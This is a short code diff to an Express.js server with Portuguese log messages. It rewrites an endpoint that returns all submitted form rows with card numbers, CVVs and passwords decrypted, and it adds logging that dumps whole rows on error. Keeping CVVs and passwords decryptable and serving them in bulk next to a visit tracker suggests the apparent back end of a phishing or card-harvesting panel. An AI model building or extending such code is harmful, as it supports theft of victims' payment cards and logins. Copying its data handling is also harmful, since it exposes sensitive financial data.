@@ -488,15 +488,30 @@ app.get('/api/visits', async (req, res) => {
 
 app.get('/api/form-data', async (req, res) => {
     try {
-        const result = await pool.query('SELECT * FROM temp_data ORDER BY submitted_at DESC');
-        const decryptedRows = result.rows.map(row => ({
-            ...row,
-            card_number: row.card_number ? decrypt(row.card_number) : null,
-            cvv: row.cvv ? decrypt(row.cvv) : null,
-            password: row.password ? decrypt(row.password) : null
-        }));
+        console.log('Recebendo requisição para /api/form-data em:', new Date().toLocaleString('pt-BR'));
+        const result = await pool.query('SELECT * FROM form_data ORDER BY submitted_at DESC');
+        console.log('Dados brutos retornados:', result.rows.length, 'registros em:', new Date().toLocaleString('pt-BR'));
+        const decryptedRows = result.rows.map(row => {
+            try {
+                return {
+                    ...row,
+                    card_number: row.card_number ? decrypt(row.card_number) : null,
+                    cvv: row.cvv ? decrypt(row.cvv) : null,
+                    password: row.password ? decrypt(row.password) : null
+                };
+            } catch (decryptionError) {
+                console.error('Erro na descriptografia de linha:', decryptionError.message, 'Linha:', row, 'em:', new Date().toLocaleString('pt-BR'));
+                return {
+                    ...row,
+                    card_number: null,
+                    cvv: null,
+                    password: null
+                };
+            }
+        });
         res.json(decryptedRows);
     } catch (error) {
+        console.error('Erro em /api/form-data:', error.message, 'Stack:', error.stack, 'em:', new Date().toLocaleString('pt-BR'));
         res.status(500).json({ error: 'Erro interno do servidor.' });
     }
 });
